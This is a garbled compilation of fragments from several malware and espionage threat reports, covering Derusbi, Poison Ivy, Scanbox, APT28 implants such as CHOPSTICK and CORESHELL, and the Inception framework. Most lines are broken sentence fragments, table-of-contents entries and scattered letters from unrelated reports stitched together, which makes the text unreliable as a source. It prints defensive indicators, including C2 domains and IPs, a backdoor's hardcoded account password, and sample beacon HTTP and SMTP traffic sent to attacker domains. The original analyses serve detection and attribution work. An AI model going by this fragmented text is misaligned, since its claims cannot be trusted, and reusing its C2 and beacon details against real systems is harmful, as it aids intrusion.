Dropper Sample ( MD5 : 14c04f88dc97aef3e9b516ef208a2bf5 )                                 3
Backdoor DLL Sample ( MD5 : 47619fca20895abc83807321cbb80a3d )                            5
Initial C2 Phone Home Beacon                                                      6
Network Protocol and Implementation                                               7
Backdoor Functionality , Supported Commands                                        7
Post Exploitation Tool Sample ( MD5 : 2dce7fc3f52a692d8a84a0c182519133 )                  8
Network Protocol and Implementation                                               9
Backdoor DLL Sample ( MD5 : de7500fc1065a081180841f32f06a537 )                           10
C2 Communication Mechanisms                                                      12
C2 Command Invocation                                                            13
Kernel Driver Sample ( MD5 : dae6b9b3b8e39b08b10a51a6457444d8 )                          14
Entrypoint                                                                       14
Network Signatures                                                                    18
File System Artifacts                                                                 19
Registry Artifacts                                                                    19
Other Artifacts                                                                       19
Dropper / Implant # 1                                                                      25
Post Exploitation Tool                                                                  25
Implant # 2                                                                              26
Backdoor DLL                                                                            26
System Driver                                                                           26
Appendix A : Command Line Options for Post Exploitation Tool Sample                      27
Appendix B : Algorithm for computing machine ID                                          28
Appendix C : Remote Commands Supported by .NET Backdoor Post Exploitation Tool Sample    28
Appendix D : Raw bytes of example Authentication packet .                                 30
Appendix E : Initialization of KEY and IV for AES                                        30
Appendix F : Command & Control Servers                                                   31
Appendix G : Edward Sun ’s kernel network hook code                                       32
Appendix H : Command and Control MD5 Correlation                                         41
The samples were clearly malicious and varied in sophistication . All three samples provided remote access
Trojan . CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT ,
Industries in US and Japan .
Non - Governmental Organizations ( NGOs ) , State / Federal Government , Defense Industrial Base ( DIB ) , and
Dropper Sample ( MD5 : 14c04f88dc97aef3e9b516ef208a2bf5 )
The executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a ‘ dropper’ , which is
Application Programming Interfaces ( APIs ) . The imported function names are not encrypted ; however , the
//Obfuscation of GetTempPathA ( ) API function call
The dropper invokes the SHGetSpecialFolderPath ( ) API supplying a Constant Special Item ID List ( CSIDL )
The dropper binary contains an icon resource that resembles the ‘ Google Chrome’ browser icon , the re-
Backdoor DLL Sample ( MD5 : 47619fca20895abc83807321cbb80a3d )
Following this , the subroutine will set the value of the ‘ ServiceDLL’ to the module handle of the DLL .
The next key to be changed is :
The export ‘ CollectW3PerfData’ is registered as the main function of the DLL . If the installation of the new
Window with class “ NOD32_%d ” where % d is replaced with a pseudo - random number . This may be an
After creating this window , the routine starts the main thread that eventually initiates calling out to the
Command and Control ( C2 ) . In order to accomplish this task , the newly
The communication to the C2 is handled by a while ( ) loop , with each successive connection attempt
Initial C2 Phone Home Beacon
The malicious sample sends an initial beacon to the C2 that includes the following information :
Desktop session or “ none ” otherwise .
The following python function can be used to decode the beacon stings :
After sending the initial beacon , the routine loops receiving incoming commands and executes them in
Network Protocol and Implementation
The network protocol used by this sample resembles a ‘ Type - Length - Value’ layout in both directions .
Each 16 byte request header consists of :
Certain commands initiate a second connection to the C2 in a separate thread using the same network
Backdoor Functionality , Supported Commands
The primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote
Desktop over a custom protocol . It allows the adversary to view the main desktop graphically and
Command 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor
When command 0x23000004 is received , a temporary new user “ _ DomainUser _ ” with password “ Dom4!nU-
Additionally , the primary C2 connection allows for requests to start additional connections to the C2 imple-
Post Exploitation Tool Sample ( MD5 : 2dce7fc3f52a692d8a84a0c182519133 )
This sample is typical of a post exploitation tool ; it is written in .NET 2.0 . This code appears to have been
C2 .
The sample contains an embedded IP address for C2 that is stored in an encrypted format as a string re-
Network Protocol and Implementation
There are three components to the protocol :
Authentication is accomplished using a 32 byte packet , this packet consists of :
An example authentication packet sent to the C2 is located in Appendix E
Beacon , this is typical of this type of malicious sample , it allows the operator to separate various infected
An example of an unencrypted beacon :
Command handling loop , this is a loop structure that will process and execute commands sent by the C2 .
The malware sends and receives a heartbeat / keepalive packet every 2 minutes . The command format is
Backdoor DLL Sample ( MD5 : de7500fc1065a081180841f32f06a537 )
Backdoor DLL Sample ( MD5 : de7500fc1065a081180841f32f06a537 )
This sample is a sophisticated backdoor which implements several communications protocols and was
Variants of this Trojan are sometimes detected under the name ‘ Derusbi’ by Microsoft , Trend , Sophos and
Symantec AV engines .
This sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide
While there is code in the binary that allows downloading a list of C2 servers from an HTTP URL , the default
C2 Communication Mechanisms
The malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one
After establishing any of the aforementioned channels for arbitrary binary data exchange , the malware will
All C2 transport implementations contain code for accepting and handling server - side connections of the
C2 Command Invocation
The main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any
This handler class implements a generic TCP proxy . It supports establishing TCP connections to other hosts
The malware is capable of gathering various pieces of information from the system , triggered by a command
This handler class provides the attacker with the ability to manage system components including start / stop/
This handler class uses the command ID 5 and implements an interactive command line shell accessible
Kill Switch / Self - Destruction
The only command that is implemented directly in the main backdoor thread as a subprocedure call and not
Kernel Driver Sample ( MD5 : dae6b9b3b8e39b08b10a51a6457444d8 )
This sample is a packed 32-bit kernel driver extracted by the aforementioned DLL with an MD5 hash of :
Entrypoint
This section describes how the driver performs its initialization routine .
Multiple Instance Protection
The driver begins by opening a named event in the BaseNamedObjects object directory with the name
Anti - Debugging Protection
The second component of the entry point performs an anti - debugging technique , calling the function
Hooking
Network Stack Hooking
In either case , the driver obtains the device object by using IoGetDeviceObjectPointer ( ) and hooks Major
Function 14 the IRP_MJ_DEVICE_CONTROL , as this is the function through which all Input Output
Network Store Interface ( NSI ) Hook
The NSI hook , targets IOCTL 0x12001B , which is used by NsiGetObjectAllParameters ( ) in nsi.dll when
This functionality is nearly identical to the code posted by Edward Sun ( aka cardmagic , sunmy1@sina.com ,
The TCP hook works almost identically to the NSI hook , though instead hooking IOCTL 0x120003 ( IOCTL _
System Call Hooking
Windows API IoAllocateMdl ( ) , and associating the MDL to a non - paged buffer using
When the hook is installed , it writes a special DWORD value , ‘ KDTR’ , which allows it to prevent
Registry Hooks
In the registry hooking code of the driver , a call is made to ObReferenceObjectByHandle ( ) . This allows the
In the registry hook , it was noticed that “ CurrentControlSet001 ” was used as the target , if the target machine
Network Signatures
The following network signatures are designed for the popular Open Source IDS called Snort .
These signature can be ported to other formats upon request .
Malware # 1
Malware # 2
Malware # 3
File System Artifacts
Dropper / DLL
C:\Documents and Settings\All Users\Documents\infoadmn.dll ( TS : 2007 - 03 - 07 00:00:00 )
C:\Documents and Settings\All Users\Documents\infoctrs.dll ( TS : 2007 - 03 - 07 00:00:00 )
C:\Documents and Settings\All Users\Documents\infocardapi.dll ( TS : 2007 - 03 - 07 00:00:00 )
Post Explotiation Tool
Backdoor
Kernel Driver :
Registry Artifacts
The following Windows Registry artifacts are indicative of a compromised host :
Dropper / DLL
Backdoor
Other Artifacts
Dropper / DLL
Username : _ DomainUser _ Password:”Dom4!nUserP4ss ”
Backdoor
The backdoor may be detected by several different Anti - Virus products under a signature with the name :
Derusbi
Kernel Driver
Object : { 8CB2ff21 - 0166 - 4cf1-BD8F - E190BC7902DC }
Attribution in the cyber domain is always a tricky subject when relying solely on malicious samples .
Compiler artifacts and language settings can of course be deliberately masked or spoofed . CrowdStrike
Based on the corroborating evidence discovered in the course of this analysis , it appears there are
The obfuscation of the KdDisableDebugger ( ) function call is seen on several Chinese language forums ,
While the various network hooking techniques used in the kernel driver may appear novel or well
Similarly the system call hooking is less impressive after searching for “ IoAllocateMdl ” and “ cr0 ” ( bbs.pediy .
Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs .
While the driver does not use pool tags for most of its allocations , it does utilize them in the networking
The driver code ( MD5 : dae6b9b3b8e39b08b10a51a6457444d8 ) appears to be a combination of various
For more information about Intelligence - as - a - Service or
For more information about Intelligence - as - a - Service or
For more information about Intelligence - as - a - Service or
According to this Linux driver development guide ‘ embedlinux’ published on July 31 , 2008 ( http://wenku .
The samples involved in this incident are typical of attacks commonly associated with the People ’s
Republic of China ( PRC ) . These code samples have a variety of Tools , Techniques , and Procedures ( TTPs )
The ability to conduct Incident Response ( IR ) including forensics , and log analysis , greatly augments this
Dropper / Implant # 1
The dropper code ( MD5 : 14c04f88dc97aef3e9b516ef208a2bf5 ) does not utilize any techniques that are
May 4th , 2011 at 11:04:24 A.M. UTC ( early evening time in China ) . While this can be deliberately spoofed
The dropped DLL ( MD5 : 47619fca20895abc83807321cbb80a3d ) itself contains functionality that is typical
Post Exploitation Tool
The post exploitation tool ( MD5 : 2dce7fc3f52a692d8a84a0c182519133 ) is a dual - use tool , it can be
Implant # 2
Backdoor DLL
This DLL is a moderately sophisticated backdoor with several well designed communication mechanisms
System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the
System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the
Appendix A : Command Line Options for Post Exploitation Tool Sample ( MD5 :
Appendix B : Algorithm for computing machine ID
Appendix C : Remote Commands Supported by .NET Backdoor Post Exploita-
Implemented values for cmdID are as follows :
Appendix D : Raw bytes of example Authentication packet .
Appendix E : Initialization of KEY and IV for AES
Appendix F : Command & Control Servers
C2 Server    Port    Geolocation    Whois                 Samples Used In
Mertajam ,      netname :
Maylasia       TMNET - AS - AP
Telekom Malaysia
Bhd .
Malaysia Berhad
Floor , Global Data
Marketing , TM Global
Pantai Baharu
C2 Server       Port    Geolocation    Whois               Samples Used In
One - HK
Appendix G : Edward Sun ’s kernel network hook code
Hook : Hiding Port Under Windows Vista
In this post , I will share with you a simple code to hide port under Vista , hope
Actually under Windows Vista , netstat.exe will call InternalGetTcpTable2 which
Here , we will use a relatively easy way -- “ NSI Kernel Module Dispatch Routine
Check the following code(Notice : I only tested it under Windows Vista RTM
Appendix H : Command and Control MD5 Correlation
Aided Frame , Aided Direction ( Because it ’s a redirect )
Introduction :
On September 24 2014 , FireEye observed a new strategic web compromise ( SWC ) campaign that we
Quartermaster , a collective of malware authors that supports multiple China - based advanced persistent
Activity Overview :
On September 24 , FireEye observed SWCs , likely conducted by a unitary threat group based on shared
The group was able to compromise these websites and insert malicious iframes . Figure 1 displays one of
Figure 1 : The iframe that directed website visitors to a threat actor - controlled IP address
The iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45 . In turn , these
Figure 2 : The encoded payload ( snipped for brevity )
The ‘ bin’ param shown in Figure 2 is decoded from ASCII into hex by the Java exploit . Once decoded ,
Size            25608 bytes
Compile Time          2014 09 15 08:21:23
Import Hash           09d0478591d4f788cb3e5ea416c25237
The Poison Ivy variant was also code signed with the below certificate :
Serial Number              581AE6B6ABAFD73AC85B1AEFBDB2555F
Common Name                 zilliontek Co.,Ltd
Organization           zilliontek Co.,Ltd
Country               KR
State / Province          Gyeonggi - do
City                Suwon - si
Issue Date            Jan 12 00:00:00 2013 GMT
Expiration Date            Feb 20 23:59:59 2015 GMT
The backdoor also contained the below versioning info embedded in the RT_VERSION of one of the PE
Offcial Build : 1
Translation : 0×0409 0x04b0
This versioning info attempted to masquerade as a Google Chrome file . However , the malware author
The Poison Ivy implant had the following configuration properties :
C2 : quakegoogle.servequake.com , Port : 80
Password : qeTGd3485fF
Mutex : ) ! VoqA.I4
The C2 domain quakegoogle.servequake[.]com resolved to 115.126.62.100 at the time of the SWCs . Other
Figure 3 : Domains observed resolving to 115.126.62.100
Between August 30 , 2014 and September 16 , 2014 we also observed SOGU ( aka Kaba ) callback traffic sent
Links to the Sunshop Digital Quartermaster
The Poison Ivy backdoor also had a RT_MANIFEST PE resource with a SHA256 fingerprint of
This same RT_MANIFEST resource was documented in our previous Sunshop Digital Quartermaster
Conclusion
This activity represents a new SWC campaign . We suspect threat actors are leveraging their access to
Special thanks to Google ’s Billy Leonard for providing additional information and research .
Thanks to the following authors for their contributions : Mike Oppenheim , Ned Moran , and Steve Stone .
This entry was posted in Threat Intelligence , Threat Research by Sarah Engle and Ben Withnell .
Bookmark the permalink .
Scanbox : A Reconnaissance Framework Used with Watering Hole
Attacks
A few days ago we detected a watering hole campaign in a website owned by one big industrial company .
The website is related to software used for simulation and system engineering in a wide range of
The attackers were able to compromise the website and include code that loaded a malicious Javascript
Internet Explorer to enumerate software and detect security products
The Scanbox framework first configures the remote C&C server that it will use and collects a small amount
Referer
User - Agent
Location
Cookie
Title ( To identify specific content that the victim is visiting )
Domain
Charset
Screen width and height
Operating System
Language
Resulting in something like this :
Before sending the information to the C&C server , Scanbox encodes and encrypts the data with the
Producing the following request :
If we decrypt the data it translates to :
After the first request , the framework contains several plugins to extract different information from the
Pluginid 1 : Enumerates software installed in the system using the technique we explained before that
Mitigation Experience Toolkit ) :
Producing the list of security software on the target
Pluginid 2 : Enumerates Adobe Flash versions
Pluginid 5 : Enumerates Microsoft Office versions
Pluginid 6 : Enumerates Acrobat Reader versions
Pluginid 8 : Enumerates Java versions
Pluginid 21 : Implements a “ keylogger ” functionality trough Javascript that logs all the keystrokes the
While the user is browsing the compromised website , all keystrokes are being recorded and sent to the
C&C periodically . It will also send keystrokes when the user submits web forms that can potentially
As we have seen , this is a very powerful framework that gives attackers a lot of insight into the potential
We have also seen several Metasploit - produced exploits that target different versions of Java in the same
We recommend you look for this type of activity against the following machines in your network :
A WINDOW INTO RUSSIA ’S CYBER
Other APT28 Targets Are Consistent With Nation State Interests ......................................................................................................... 17
Modular Implants Indicate a Formal Development Environment ............................................................................................................... 24
Compile Times Align with Working Hours in Moscow and St. Petersburg ................................................................ 27
Our clients often ask us to assess the threat Russia poses in cyberspace . Russia has
Georgia in 2008 , as well as the rampant speculation that Moscow was behind a
In this paper we discuss a threat group whose                                      the country of Georgia , Eastern European
China - based threat actors we track , does not                                       They compile malware samples with Russian
While we do n’t have pictures of a building ,
The activity that we profile in this paper                                         personas to reveal , or a government agency to
Markoff , John . “ Before the Gunfire , Cyberattacks ” . The New York Times 12 August 2008 . Web . http://www.nytimes.com/2008/08/13/technology/13cyber.html
Knowlton , Brian . “ Military Computer Attack Confirmed ” . The New York Times . 25 August 2010 . Web . http://www.nytimes.com/2010/08/26/
Malware compile times suggest
Since 2007 , APT28 has systematically evolved its malware ,
Indicators in APT28 ’s malware suggest that the group consists of
Russian speakers operating during business hours in Russia ’s major cities .
More than half of the malware samples with Portable                   Over 96% of the malware samples we have attributed to APT28
Executable ( PE ) resources that we have attributed to APT28            were compiled between Monday and Friday . More than 89%
English settings ) , suggesting that a significant portion of           which parallels the working hours in Moscow and St.
Three themes in APT28 ’s targeting clearly
Eastern European government , most likely
M
Caucasus ( especially the Georgian government ) ,                                 pertains to the Caucasus . Similarly , APT28 ’s practice
Eastern European governments and militaries , and                               of registering domains that mimic those of legitimate
European security
Bloomberg . “ Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data . ” February 2014 .
Ibid .
Ibid .
Abkhazia                                                                     Chechnya
Kavkaz Center
Tbilisi
Armenian Military
Yerevan
T
Chechnya and other Russian republics and        Georgian that are probably intended to target
Armenia , and Azerbaijan , continues to experience        APT28 is likely seeking information on Georgia ’s
Georgian Ministry of Internal Affairs ( MIA )
Ministry of Internal Affairs ( MIA )                                                    establish a connection to a Georgian MIA mail
The MIA harbors sensitive information about the                                       server and communicate via MIA email addresses
Georgian Ministry of Internal Affairs website http://police.ge/en/home
Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi .
Ministry of Defense                                 and Georgian Armed Forces , assess Georgia ’s
Figure 1 : Georgian MIA - related decoy
Figure 2 : Excerpt of APT28 ’s letter to a journalist writing on Caucasus - related issues
We wish our cooperation will be both profitable and trusted . Our aim in the Caucasian region is
Send your articles on this email – in Russian or English , please . There are some difficulties with
Caucasian languages , but we ’ll solve the problem pretty soon , I hope .
Targeting journalists could provide APT28 and its sponsors
We believe that APT28 ’s targeting of the MOD                                       APT28 Targeting a Journalist Covering
Russia severed diplomatic relations following the                                  Caucasus region . In late 2013 , APT28 used a lure
Russia - Georgia War in 2008 , and Georgia has                                        that contained a letter addressing a journalist by
June 2014 , despite Russia ’s vocal objections ,                                      “ Caucasian Issues Department ” - a division that
Georgia , along with Ukraine and Moldova , signed                                    does not appear to exist.6 ( Reason Magazine is a
Web . http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm
We attempted to identify candidate journalists in the country . One of these was a Georgian national of Chechen descent , whose work appears to center on
Chechen and human rights issues . Ultimately , however , we can not confirm the identity of the target(s ) .
Table 1 : Examples of APT28 domains imitating organizations in the Caucasus
The Kavkaz Center / The Caucasus Center , an international Islamic news agency with coverage of
Islamic issues , particularly Russia and Chechnya ( kavkazcenter.com )
The body of the letter suggests that APT28 actors                                 APT28 ’s Other Targets in the Caucasus
Targeting journalists could provide APT28 and its
Caucasus independence issues would be a prime                                     continues to host the Kavkaz Center website .
Journalists critical of the Kremlin have long
Moran , Ned , Villeneuve , Nart , Haq , Thofique , and Scott , Mike . “ Operation Saffron Rose ” . FireEye . 13 May 2014 . Web . http://www.fireeye.com/blog/technical/
The New York Times publicly disclosed their breach by APT12 , which they assess was motivated by the China - based actors’ need to know what the
Sweden - to - ban - Chechen - website - server/
E
Figure 3 : Decoy MH17                                                                                                government interests . The Kremlin has long
Eastern European governments and militaries .
Government Organizations
We have evidence that APT28 made at least two
Foreign Affairs detected APT28 malware in
Malaysia Airlines flight downed in Ukraine in
Table 2 : Examples of APT28 domains imitating legitimate Eastern European organization names
We have evidence that APT28 made at least two attempts
In addition , APT28 used one domain for command                                      Kremlin press cited Russia ’s interpretation of
States ( Estonia , Latvia , and Lithuania , all three of
In June 2014 , this event was integrated with a
Lithuania Ministry of National Defense . 12 June 2014 . Web . http://www.kam.lt/en/news_1098/current_issues/baltic_host_2014_rendering_host_nation_
A
As the traditional western counterweight to the                                      Future Forces Exhibition . We also observed a user
Soviet Union , Russia regards NATO , particularly                                      that we suspect works for NATO HQ submit an
Table 3 : Examples of APT28 domains imitating legitimate NATO and security websites
The Military Doctrine of the Russian Federation , approved by Presidential edict on 5 February 2010 .
Figure 4 : Decoy
Finally , APT28 used a lure that contained an apparent
Figure 5 : Ankara
Military Attache Corps
Defense Exhibitions                                    “ Defence , Security , Energy , Utilities , Finance and
In addition to targeting European security             Pharmaceutical sectors . ” Among other events , the
Airshow 2014 , EuroNaval 2014 , EUROSATORY               provide APT28 with an opportunity to procure
Targeting organizations and
A
Other probable APT28 targets that we have
Chechnya Global
Diplomatic Forum
Lure Document
Military Trade Shows
Phishing Email
T
M
S
Y
M
N
N
M
V
N
E AT
A
N                       IR
Y
O ( MFA )
K AS
M
N
S
S
I
W
Y
N NGO
Lure Document
Phishing Email
Our analysis of some of the group ’s more
A
Some of APT28 ’s more commonly used tools are             • 	    CHOPSTICK : This is a modular implant
A number of the malware variants that we profile      • 	    One of the latest samples of CORESHELL
Figure 6 : Typical deployment of SOURFACE ecosystem
Spearphishing Email
Document with exploit
Dropper malware
Deploys 2nd stage droppers
First , a malware family is a collection of malware in which each sample shares a significant
A malware ecosystem is a group of malware families that work together to perform
The ecosystem surrounding the SOURFACE downloader frequently
In April 2013 , based on compile time , the group
The hostname , volume serial number and OS
As seen in the table below , the SOURFACE/                                     http://[hostname]/~xh / ch.cgi?enhkZm1GNmY1YWg0eGcxMGQ1MDUwMQ==
Table 4 : Evolution of SOURFACE downloader over time
Basic anti - debug measures added ( process listing , rand timing , is DebuggerPresent ) .
Switches from loading a secondary DLL ( netui.dll/WinIDS.dll ) to uploading the contents of % temp%\chkdbg.log .
Statically links msvcrt library .
Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used , then reversed back after use .
This version added assembly level obfuscation , which slows down analysis . This variant requires the OS to be at least Windows Vista .
In April 2013 , based on compile time , the
Figure 8 : NATO - themed decoy
Variants of the SOURFACE second stage                                                 Interestingly , we found an antivirus report from
Simple Mail Transfer Protocol ( SMTP ) to send                                          as early as 2004.24
Although the malware family and interest in NATO make it likely that APT28 was involved , we can not conclusively attribute this sample to APT28 based on
A modular development framework                                                     CHOPSTICK variants may move messages and
One CHOPSTICK v1 variant contained
D
D
Use of Russian and English Language                                           attributed to APT28 and contained PE resources .
Settings in PE Resources                                                      Table 5 shows the locale identifiers27 with
Table 5 : Locale and language identifiers associated with APT28 malware
Number of APT28
Locale ID 	                Primary language                                                             Country / Region
English ( en )                                                                 United Kingdom ( GB )                           1
Microsoft Developer Network – Multiple Language Resources http://msdn.microsoft.com/en-us/library/cc194810.aspx
Microsoft Developer Network – Language Identifier Constants and Strings http://msdn.microsoft.com/en-us/library/dd318693.aspx
The samples with Russian language settings were            with Russian language settings at least some of
Figure 9 : Number of APT28 samples with Russian language settings by compile month
May
August
May
September
March
August
September
October
November
December
June
September
December
May
June
July
October
December
July
August
October
November
December
Compile Times Align with Working
Hours in Moscow and St. Petersburg
Of the 140 malware samples that we have
Figure 10 : Compile Times of APT28 malware in UTC Time
Moscow business hours
We started researching APT28 based on activity                APT28 ’s characteristics — their targeting , malware ,
Figure 11 below .
Figure 11 : Summary of key observations about APT28
Evolves and Maintains Tools for Continued , Long - Term Use
Various Data Theft Techniques
Georgia and the Caucasus
Eastern European Governments & Militaries
Security - related Organizations
Russian Language Indicators
Malware Compile Times Correspond to Work Day in Moscow ’s Time Zone
We use the term “ threat group ” to refer to actors        Threat actors leave behind various forensic
The art of attributing disparate intrusion activities    addresses or domain names embedded . These are
Different groups may use similar intrusion               details that we consider when distinguishing one
Distinguishing one threat group from another is          activity with a particular group .
Figure 11 : Example CORESHELL POST request
User - Agent : MSIE 8.0
Host : adawareblock.com
Content - Length : 58
Cache - Control : no - cache
When Base64 decoded , the POST content looks like this :
The key used to encrypt the message is six bytes long and is appended to the end of the message . In this is
The following table contains a breakdown of each of the field ’s C2 message .
Table 6 : Example CORESHELL beacon structure
Offset 	       Value                     Description
Commands are sent from the C2 server to the CORESHELL backdoor in HTTP responses to the POST
Figure 12 : Example CORESHELL controller response
Content - Type : text / html ; charset = utf-8
Content - Length : 58
O.K ... AQAAAKqqAQEBAQEBAQEVzPMEUUIzQtND8kOSRLVEVUV0RRRGN0bX
The Base64 decoded string is :
The following table contains a description of each field in the command message :
Table 7 : CORESHELL C2 message structure
Offset 	       Value                         Description
When the above command “ 10 41 70 41 10 42 33 … ” is decrypted using the key “ 01 01 01 01 01
The implant supports the following four command identifiers from the controller as seen in Table 8 . The
Table 8 : CORESHELL commands
Command ID            Description
The first time CHOPSTICK is executed , it may encrypt and store configuration data in the Registry key
The configuration block is encrypted using RC4 encryption . The key is a combination of a 50-byte static
Vista and above and Internet Explorer settings . It also tests for the installation of specific security
Table 9 : Endpoint security products detected by CHOPSTICK
Service Name 	                                         Security Product
Acssrv                                                Agnitum Client Security
Ekrn                                                  ESET
Table 10 : Applications detected by CHOPSTICK
Process Name 	                                                Application
After collecting host information , CHOPSTICK creates a hidden file that may be named
After approximately 60 seconds of execution time , CHOPSTICK begins communicating with one of its C2
Figure 13 : Sample CHOPSTICK v2 HTTP POST
Accept : text / html , application / xhtml+xml , application / xml;q=0.9,*;q=0.8
Accept - Language : en - us , en;q=0.5
Accept - Encoding : gzip , deflate
User - Agent : Mozilla/5.0 ( Windows NT 6 . ; WOW64 ; rv:20.0 ) Gecko/20100101
Firefox/20.0
Host : windows-updater.com
Content - Length : 77
Cache - Control : no - cache
A mailslot is a Windows inter - process communication ( IPC ) mechanism similar to a named pipe , but is designed for one - way communications between
The message body of the POST request is also Base64 encoded . This encoded string is also prefixed with
After uploading edg6EF885E2.tmp , CHOPSTICK continues to query its C2 servers for commands using
Modularity
Figure 14 : Sample CHOPSTICK v1 HTTP POST including module identification
Accept : text / html , application / xhtml+xml , application / xml;q=0.9,*/*;q=0.8
Accept - Language : en - us , en;q=0.5
Accept - Encoding : gzip , deflate
User - Agent : Mozilla/5.0 ( Windows NT 6 . ; WOW64 ; rv:20.0 ) Gecko/20100101
Firefox/20.0
Host : adobeincorp.com
Content - Length : 71
Cache - Control : no - cache
To decode the POST content , the first step is to remove characters from the Base64 string ( the number of
The first two words ( “ 72 11 ” and “ fd 22 ” ) are checksums that are used to validate the message . The next 4
The strings “ V4MGNxZWlvcmhjOG9yZQ ” and “ = < < \xee ” are hardcoded in the implant . The module
Table 11 : Example CHOPSTICK v1 message format
Offset 	       Value                                    Description
The modules included in this CHOPSTICK v1 implant are :
Table 12 : Example CHOPSTICK v1 module list
Module ID          Internal Module Name             Description
Our determination of a CHOPSTICK “ v1 ” versus “ v2 ” is based on the self - identification of the kernel ID
Table 13 : Example CHOPSTICK v2 module list
Module ID          Internal Module Name             Description
The kernel IDs 0x0001 and 0x0002 indicate different versions . The corresponding modules in each
The kernel sends commands to each module using its module ID . The commands that each module
Table 14 : Commands understood by modFS ( 0x1101 ) module
Command ID 	              Description          Example
Table 15 : Commands understood by modProcRet ( 0x1301 ) module
Command ID 	              Description          Example
Both email and HTTP can be used to send out the collected credentials . Sample HTTP traffic is
Figure 15 : Example OLDBAIT HTTP traffic
Accept : text / html
Accept - Language : en - us
Content - Type : application / x - www - form - urlencoded
Content - Length : 6482
User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 )
Host : windous.kz
Connection : Keep - Alive
Pragma : no - cache
Figure 16 : Example OLDBAIT SMTP traffic
From : lisa.cuddy@wind0ws.kz
To : dr.house@wind0ws.kz
Subject : photo(9a3d8ea4-test )
Date : Tue , 23 Sep 2014 15:42:56 -0500
Content - Type : text / plain ;
Content - Transfer - Encoding : 7bit
X - Priority : 3
X - MSMail - Priority : Normal
X - Mailer : Microsoft Outlook Express 6.00.2900.2670
X - MimeOLE : Produced By Microsoft MimeOLE v6.00.2900.2670
X - Spam : Not detected
All other brands , products , or service names are or may be trademarks or service marks of
Whitepaper :
The Inception Framework :
Cloud - hosted APT
By Snorre Fagerland and Waylon Grange
Blue Coat Systems , Inc
Executive summary
Blue Coat researchers have uncovered a previously - undocumented , highly
Initial malware components were embedded in Rich Text Format ( RTF ) files .
Exploitation of vulnerabilities in this file format is leveraged to gain remote access
The framework , thus far , has been using the services of a cloud service provider
Android , were also recovered during the course of our research .
The framework is designed in such a way that all post - infection communication
Initial attacks were largely focused on Russia and a few other Eastern European
The framework is itself target - agnostic , and seems highly automated .
The operational security exhibited by the attackers is very good - among the best
Although the attackers have left a few clues , we have been unable to provide
Introduction
The use of software vulnerabilities in order to execute malicious software on
The use of exploits in document formats like PDF , DOC and RTF is in some
In March , 2014 , Microsoft published information about a new vulnerability in Rich
Text Format ( RTF ) . This vulnerability , named CVE-2014 - 1761 ( Microsoft Word
By late August , we identified a malware espionage operation that used both the
When we examined the suspicious documents , it was discovered that they were
Due to the many levels of obfuscation and indirection , we named this the
Inception framework ; but there ends all similarity with the movie by the same
Use of trojanized documents
We initially knew little about who the actual targets were ; apart from one . In that
The weaponized Microsoft Word document attached to the email message
Above : “ Mrs. World ” . Text and picture apparently taken from the news site mk.ru
We soon discovered that our malware repository contained several other , similar
Russian issues relating to a variety of business sectors . The following pages
An article cribbed verbatim from the
Novye Izvestiya news Web site
An application form to participate in
Russia ’s Federal Service for
Defense Contracts ( “ Федеральная
An article , in English , about the
Ukraine situation taken from the
Financial Times ( UK ) newspaper .
An “ advertisement ” from a supplier
Guard department of the FSB
An advertisement of a used car for
Embassy in Moscow .
Invitation to Russian Art Week
Document metadata
All documents that we have found so far have been rather standard Word
Such documents can , and typically do , contain quite a bit of metadata : The name
However , Word documents in this format contain additional information , if you
All Word documents of this format contain what ’s known as a File Information
Block ( FIB ) . The FIB contains information about the file ’s internal structure , and
In addition , documents can contain slack space in which old data remains . For
Targeted verticals
Despite the limited information at our disposal about the targets of these attacks ,
First of all , we have the decoy documents which indicate an interest in :
We also have a set of phishing mails , which were targeted at :
Shellcode
The shellcode used is a pretty standard variant previously used by a number of
Above : The decoding loop
Upon successful execution this code drops a Word document and a Visual Basic
Unusual for many exploit campaigns , the names of the dropped files vary ; for
Visual Basic Script dropper
The VBScript dropper code is also a little unusual . It declares a Windows
Management Instrumentation ( WMI ) object in order to reach components like the
When the VBSript is run it drops two files to disk . One is a polymorphed dll file
The files will be installed in several locations :
These locations will vary some between operating system versions .
The VBScript then sets a startup key in the
Regardless of whether the registry launches the DLL or when another malware
The names of these dropped files change from attack to attack . The one above
The encrypted data files are named using random words apparently taken from a
Looking at one of the dropped dlls we can see the authors originally called it
In the early stages of our research , most other payloads followed the same
It is hard to describe the polymorphed dlls with any real depth , as there is little
A portion of one of the dynamically generated functions .
What is common is that somewhere along the execution cycle is one extremely
The order , size , and locations of these segments vary from build to build but
Here , pausing execution before the call to ‘ load_pe_from_memory’ reveals the
This reconstructed DLL , once loaded , will decode a configuration structure from
This configuration information is used to load the encrypted file into memory and
This last dll is the heart of the threat ( originally called q5Byo.dll in this instance .
This file contains the true intent of this campaign . It is designed as a survey tool .
The PE file gathers system information including OS version , computer name ,
The malware installation chain
The use of WebDAV as the communication channel is atypical for most malware
Additionally , once the resource is established , the malware can transfer files to
All the authentication information for the WebDAV session including the URL ,
A unique path , username , and password were used for each malware instance
Also contained within the configuration structure is information on how to name
An example would be “ _ 1 - 7d_0 - 8s ” , [ “ TIF ” , “ TAR ” , “ SIT ” ] which instructs the
The survey is then uploaded to the server in a specified folder with the generated
Files are compressed using a modified LZMA - compression and encrypted using
The binary also checks a separate folder on the cloud service designated to
The cloud storage provider in every case we have seen was the Swedish
The URI model used by the malware is
It must be noted that the CloudMe service is not actively spreading the malicious
We notified CloudMe.com about the abuse of their services . Their CEO , Mr.
Daniel Arthursson , was none too happy about this , and was very helpful in our
Distribution of logged victim connections towards CloudMe .
